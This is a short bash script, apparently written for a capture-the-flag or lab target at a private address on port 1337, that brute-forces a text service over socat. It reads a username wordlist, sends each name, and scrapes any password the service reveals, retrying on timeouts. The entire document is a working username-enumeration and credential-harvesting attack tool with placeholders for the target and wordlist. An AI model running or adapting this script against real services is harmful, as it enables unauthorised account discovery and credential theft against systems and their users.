#!/bin/bash

username_file="{dictionary}"

if [ ! -f "$username_file" ]; then
    echo "Error: Username file '$username_file' not found."
    exit 1
fi

check_username() {
    local username="$1"
    response=$( (echo "$username") | socat - TCP:10.10.57.117:1337,connect-timeout=1 )
  
    if echo "$response" | grep -q "Password"; then
        echo "Password prompt received for username '$username'!"
        password=$(echo "$response" | grep -oP '(?<=Password: )\w+')
        if [ -n "$password" ]; then
            echo "The password for user '$username' is: $password"
        else
            echo "No password found for user '$username'."
        fi
    elif echo "$response" | grep -q "Username not found"; then
        echo "Username '$username' not found."
    elif echo "$response" | grep -q "Welcome"; then
        echo "Welcome message received for username '$username'!"
    elif echo "$response" | grep -q "Connection timed out"; then
        echo "Connection timed out while trying user '$username'. Retrying..."
        return 1
    else
        echo "Unexpected response: $response"
    fi
    return 0
}

initial_response=$(echo "yes" | socat - TCP:{IP}:1337,connect-timeout=1)

if echo "$initial_response" | grep -q "Please enter your username"; then
    echo "Username prompt received. Starting brute force..."

    line_number=0
    while IFS= read -r username; do
        line_number=$((line_number + 1))
        echo -n "Trying username: $username... "
        while true; do
            check_username "$username"
            result=$?
            if [ $result -eq 0 ]; then
                break
            elif [ $result -eq 1 ]; then
                sleep 5
            fi
        done
        sleep 1
    done < "$username_file"
else
    echo "Did not receive the username prompt. Initial response was:"
    echo "$initial_response"
fi
